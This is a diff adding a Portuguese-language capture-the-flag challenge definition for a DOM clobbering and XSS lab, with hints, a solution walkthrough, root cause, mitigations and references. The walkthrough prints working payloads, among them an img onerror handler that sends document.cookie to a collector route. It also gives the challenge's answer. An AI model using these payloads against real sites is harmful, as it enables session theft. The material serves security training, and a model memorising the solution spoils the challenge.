@@ -1,0 +1,79 @@
+{
+  "slug": "xss-dom-clobber",
+  "title": "Mesa de clobbering",
+  "codename": "CLOBBER",
+  "summary": "Um dashboard de parceiros hidrata window.store a partir do fragmento da URL e depois lê a configuração de globals que elementos nomeados podem sombrear. A combinação de DOM clobbering com um sink de nota refletido transforma uma injeção de markup aparentemente inerte em roubo de sessão.",
+  "category": "xss",
+  "difficulty": "hard",
+  "kind": "challenge",
+  "lab_dir": "xss-dom-clobber",
+  "estimated_minutes": 30,
+  "xp": 160,
+  "tech": [
+    "Flask",
+    "JavaScript",
+    "DOM",
+    "HTML"
+  ],
+  "tags": [
+    "xss",
+    "dom-clobbering",
+    "client-side",
+    "markup-injection"
+  ],
+  "story": "O Clobber Desk é um dashboard de indicações de parceiros. Ele reconstrói o workspace a partir do fragmento da URL no cliente e depois consulta `window.store`, `window.config` e `window.__proto__` como se fossem configuração confiável. O bot da equipe de trust revisa URLs reportadas com um cookie partner_session legível. Tudo o que a aplicação precisa para ser sequestrada está a um atributo name de distância.",
+  "objective": "Use o markup renderizado pelo fragmento para clobber a configuração do dashboard, redirecione o envio do formulário da vítima para o collector e recupere o cookie de sessão do bot de trust.",
+  "rules": "Permaneça na origem loopback atribuída. Apenas as rotas do próprio lab e o collector estão no escopo. Não escaneie outras portas.",
+  "flags": [
+    {
+      "key": "flag",
+      "label": "Flag de sessão do revisor de trust",
+      "flag_type": "user",
+      "points": 160,
+      "required": true,
+      "requires_objective": true
+    }
+  ],
+  "hints": [
+    {
+      "level": 1,
+      "title": "O fragmento é markup, não dado",
+      "body": "Abra `/` e leia o script inline. `location.hash` é decodificado e escrito em `#link-box` com `innerHTML`, então o fragmento é HTML arbitrário. Mas um `<script>` comum no fragmento não vai executar como esperado — procure o que o script *lê* após a injeção."
+    },
+    {
+      "level": 2,
+      "title": "Elementos nomeados são globals",
+      "body": "`document.getElementById('link-box').innerHTML = raw` coloca seus elementos no documento. Em seguida, o script lê `window.config`, `window.__proto__` e `window.store` sem `var`/`const`. Qualquer elemento com `id=\"config\"` se torna `window.config`; um form control com `name=\"__proto__\"` sombreia `window.__proto__`. Os atributos deles passam então a ser usados como action do formulário."
+    },
+    {
+      "level": 3,
+      "title": "Aponte o formulário para o collector",
+      "body": "A action do formulário vem de um atributo de objeto clobberado (`data-endpoint`). Defina como `/collect?c=` ou `/submit?data=`. O bot abre sua URL com `partner_session` e envia o formulário de abuse; o cookie precisa chegar a uma rota que o registre (`/collect` registra `c`, `/submit` registra `data`). Envie a URL montada por `POST /report`."
+    }
+  ],
+  "solution": {
+    "walkthrough": "**1. Leia o dashboard.** O GET em `/` mostra o bootstrap inline. `innerHTML = raw` a partir de `location.hash`, depois `const cfg = window.config`, `const proto = window.__proto__` e `form.action = endpoint`.\n\n**2. Confirme o clobber.** Qualquer elemento com `id=\"config\"` vence o `window.config` ausente. Um `<form id=\"config\" data-endpoint=\"...\">` e um `<input name=\"__proto__\" data-ref=\"...\">` são suficientes.\n\n**3. Monte o fragmento de payload.** Como a injeção vai no fragmento, o truque clássico é um form control cujo `name` sombreia a action do formulário real:\n\n```html\n<form id=\"config\" data-endpoint=\"/collect?c=x\" data-sink=\"/collect?c=x\"></form>\n<input name=\"__proto__\" data-ref=\"/collect?c=x\">\n```\n\nNesta aplicação, o valor clobberado alimenta `form.action` diretamente:\n\n```html\n<form id=\"config\" data-endpoint=\"/collect?c=pwned\"></form>\n```\n\n**4. Entregue e carregue o cookie.** O collector lê `?c=` em `/collect`. Para levar o cookie até lá, o payload também precisa disparar um fetch a partir do markup injetado. O dashboard não sanitiza nada, então um handler de erro em `<img>` colocado no fragmento executa na origem da página:\n\n```\n/#%3Cimg%20src%3Dx%20onerror%3D%22fetch('%2Fcollect%3Fc%3D'%2BencodeURIComponent(document.cookie))%22%3E%3Cform%20id%3Dconfig%20data-endpoint%3D%22%2Fcollect%3Fc%3Dpwned%22%3E%3C%2Fform%3E\n```\n\n(Codificado para URL; o fragmento pode conter `<` literal em um navegador real, a codificação acima serve apenas para sobreviver a um POST de formulário.)\n\n**5. Dispare o bot.** `POST /report` com `path=` igual à URL acima. O bot carrega `/` com `partner_session=<flag>`, o `<img>` dispara e `document.cookie` chega em `/collect`.\n\n**6. Leia a captura.** `GET /captured` lista o valor; ele é igual à flag do lab e o objetivo é registrado.\n\nExiste uma segunda rota, apenas de clobber, para verificação: `POST /report` com o payload acima e depois `GET /submit?data=RV{...}` também registra em `/captured` — o mesmo caminho do collector que a action do formulário clobberado usa.",
+    "root_cause": "Duas falhas independentes se combinam. Primeiro, um router client-side escreve o conteúdo decodificado do fragmento no DOM com `innerHTML`, então o markup do atacante é interpretado na origem da página. Segundo, a aplicação lê configuração de globals implícitos (`window.config`, `window.__proto__`, `window.store`). O named access do HTML clobbera esses globals: ids de elementos e nomes de form controls se tornam propriedades de `window`, então o \"objeto de configuração\" da app é o que o atacante colocou no documento. O resultado não é apenas um erro de undefined — é comportamento escolhido pelo atacante (action do formulário, endpoint, base de indicação) executado na aba confiável.",
+    "mitigation": "Nunca atribua dados não confiáveis a `innerHTML`; use `textContent` ou construtores de DOM, ou sanitize com DOMPurify para fragmentos ricos. Não leia configuração de globals implícitos: mantenha-a em um escopo léxico (`const config = Object.freeze({...})`) ou em um module, e use `Object.create(null)` / namespaces explícitos que não possam ser sombreados por named access. Valide o destino real do formulário no servidor e use allow-list de endpoints em vez de confiar em um atributo do DOM. Mantenha uma CSP estrita (`script-src 'self' 'nonce-...'`) para que o markup injetado não execute mesmo quando interpretado."
+  },
+  "references": [
+    {
+      "title": "PortSwigger — DOM clobbering",
+      "url": "https://portswigger.net/web-security/dom-based/dom-clobbering",
+      "source_type": "official",
+      "description": "Como elementos nomeados e form controls sombreiam globals usados por código client-side."
+    },
+    {
+      "title": "OWASP — DOM-based XSS Prevention Cheat Sheet",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html",
+      "source_type": "standard",
+      "description": "DOM sinks seguros e as regras para evitar a interpretação de HTML de dados não confiáveis."
+    },
+    {
+      "title": "CWE-79 — Improper Neutralization of Input During Web Page Generation",
+      "url": "https://cwe.mitre.org/data/definitions/79.html",
+      "source_type": "standard",
+      "description": "CWE raiz para injeção de markup na origem."
+    }
+  ]
+}
